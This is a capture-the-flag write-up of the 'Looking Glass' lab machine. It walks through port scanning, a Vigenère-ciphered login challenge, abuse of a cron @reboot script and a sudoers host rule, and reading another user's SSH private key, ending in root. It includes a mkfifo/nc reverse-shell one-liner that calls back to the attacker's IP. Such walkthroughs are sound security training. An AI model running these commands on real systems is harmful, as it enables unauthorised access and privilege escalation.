## Enumeration

### rustscan + nmap

```
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13641/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13642/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn

[...MAD LONG OUTPUT...]

13991/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13992/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13996/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13997/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13998/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
13999/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
WTF is all those open ports? This scan took me a bit...

All of those are SSH??? (lol)

ok This was a fun trickery: if you connect to any port it says either "higher" or "lower", but its actually the opposite you should do. 

By example I connected to the very last open port and it said "higher"

```
└──╼ $ssh 10.10.20.224 -p 13999
The authenticity of host '[10.10.20.224]:13999 ([10.10.20.224]:13999)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.20.224]:13999' (RSA) to the list of known hosts.
Higher
```

So let's try random ports lower

```
└──╼ $ssh 10.10.20.224 -p 11975
The authenticity of host '[10.10.20.224]:11975 ([10.10.20.224]:11975)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.20.224]:11975' (RSA) to the list of known hosts.
Lower
Connection to 10.10.20.224 closed.
```
So I can do this an keep on reducing the range (wow repetitive tasks are so much fun)

After playing "hot and cold" we get this:

```
└──╼ $ssh 10.10.20.224 -p 12612
The authenticity of host '[10.10.20.224]:12612 ([10.10.20.224]:12612)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.20.224]:12612' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

Not ROT13...more like vigenère but I got no key...

hey! let's try to bruteforce it online...

Bingo! once we submit the secret we found, we get `jabberwock` credentials

```
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
jabberwock:CornersHoldingNicelyStopped
```

## Exploitation

```
jabberwock@looking-glass:~$ ls -al
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 .
drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jabberwock jabberwock  220 Jun 30  2020 .bash_logout
-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30  2020 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30  2020 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30  2020 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30  2020 .local
-rw-r--r-- 1 jabberwock jabberwock  807 Jun 30  2020 .profile
-rw-rw-r-- 1 jabberwock jabberwock  935 Jun 30  2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock   38 Jul  3  2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock   38 Jul  3  2020 user.txt
jabberwock@looking-glass:~$ cat user.txt
...

```

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
(root) NOPASSWD: /sbin/reboot
```
Lol what?

```
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```
Oh okay!


```
jabberwock@looking-glass:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.4.19 4444 >/tmp/f" > twasBrillig.sh
jabberwock@looking-glass:~$ sudo reboot
Connection to 10.10.20.224 closed by remote host.
Connection to 10.10.20.224 closed.
```
Be careful there! 

if you mess up, you have to re-do everything, as you are rebooting the machine!

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 37914
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
```

```
$ ls
humptydumpty.txt
poem.txt
$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b

```

Seriously...you got this one

`the password is [REDACTED]`

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tweedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: [REDACTED]

humptydumpty@looking-glass:/home/tweedledum$ id
id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```
That guy just got another POEM in his folder so dead-end!

after a mad long time of confused enumeration (linpeas and stuff), we notice we have some weird permissions over alice folder

We have execute permission!


```
humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfE                                               Q+GO+5BBg38+aJ
cUIN [REDACTED BECAUSE YOU HAVE TO SUFFER!]  ena/HyWLxXWHxG6ji7aW
DmtV                                           mlR+RHCb40pZjBgr5
8bjJl                                          r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
-----END RSA PRIVATE KEY-----
```

```
└──╼ $chmod 600 alice.rsa

└──╼ $ssh alice@10.10.20.224 -i alice.rsa
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
```
Now what?

After another big time of confusion (forums and stuff) I got it!

```
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
Alice can get a root shell on the host but "reversed" 

so we specify the host in our sudo command

```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# id
uid=0(root) gid=0(root) groups=0(root)
```
that was cool!

```
root@looking-glass:/root# cat the_end.txt
She took her off the table as she spoke, and shook her backwards and forwards with all her might.

The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—

—and it really was a kitten, after all.
```

## Extra notes:

This machine was very original and fun, and reading the afterwards forums I learnt that the correct SSH port and first access credentials changed on every reboot!
So my port might be different from yours and I think it's a great thing! 


